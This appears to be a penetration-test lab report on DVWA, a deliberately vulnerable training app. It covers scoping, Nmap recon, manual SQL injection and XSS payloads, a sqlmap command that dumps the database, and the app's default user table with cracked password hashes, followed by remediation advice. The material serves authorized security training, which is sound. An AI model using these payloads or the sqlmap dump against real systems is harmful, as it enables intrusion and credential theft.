# Pre Engagement Interaction
## Objective:
Assess the security of DVWA running on 192.168.74.16 focusing on web vulnerabilities (SQLi, XSS, auth issues) and test detection via Tools like:
- Openvas
- Sqlmap
## In‑scope:
DVWA VM IP (192.168.74.16)
## out-of-scope:
No DOS attack
## Rule of Engagement:
- Testing vulnerable lab, authorized users only.
- Use only agreed tools: Nmap, sqlmap, OpenVAS, Burp, browser.

# Intelligence Gathering
Nmap scan on DVWA host:

<img width="646" height="532" alt="nmap" src="https://github.com/user-attachments/assets/029ea640-ac43-4223-83bc-6d31fb3110c4" />

Simple web recon:
Browse to http://192.168.1.200/dvwa/

<img width="1163" height="822" alt="image" src="https://github.com/user-attachments/assets/37fa611a-d6a6-4042-a330-2713a445090f" />

# Vulnerability Analysis
## SQL Injection:
DVWA -> SQL Injection (classic GET parameter injection).
Manually try 1' OR '1'='1 etc. to confirm SQLi.

<img width="1216" height="166" alt="image" src="https://github.com/user-attachments/assets/8da6a2b5-7c46-499d-8e1d-5e1300964e7d" />


## XSS:
Reflected XSS
Use simple payload:
<script>alert('XSS')</script>

<img width="836" height="645" alt="image" src="https://github.com/user-attachments/assets/d146f23d-e6dd-4b23-b240-d00cd326c2a2" />

# Exploitation
Now turn the manual SQLi into automated exploitation with sqlmap.
## SqlMap
sqlmap cmd:
sqlmap -u "http://192.168.74.16/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" \
  --cookie="PHPSESSID=db523e19df7fda7083c3f6ee2172ad45; security=low" \
  -D dvwa --dumpall

<img width="793" height="858" alt="image" src="https://github.com/user-attachments/assets/64c3b1eb-ad09-46f8-9acd-9ec96e842458" />

| **user_id** | **user** | **avatar** | **password** | **last_name** | **first_name** |
| --- | --- | --- | --- | --- | --- |
| 1 | admin | http://172.16.123.129/dvwa/hackable/users/admin.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin |
| 2 | gordonb | http://172.16.123.129/dvwa/hackable/users/gordonb.jpg | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon |
| 3 | 1337 | http://172.16.123.129/dvwa/hackable/users/1337.jpg | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack |
| 4 | pablo | http://172.16.123.129/dvwa/hackable/users/pablo.jpg | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo |
| 5 | smithy | http://172.16.123.129/dvwa/hackable/users/smithy.jpg | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob |


# Remediation 
## For SQL Injection:
- Use prepared statements / parameterized queries.
- Avoid dynamic string concatenation.
- Enforce least privilege on DB users (no root from web app).

## For XSS:
- Apply output encoding (e.g., HTML entity encoding for user input).
- Validate and sanitize inputs (allowlists).
- Use security headers where appropriate (CSP, X‑XSS‑Protection where relevant)

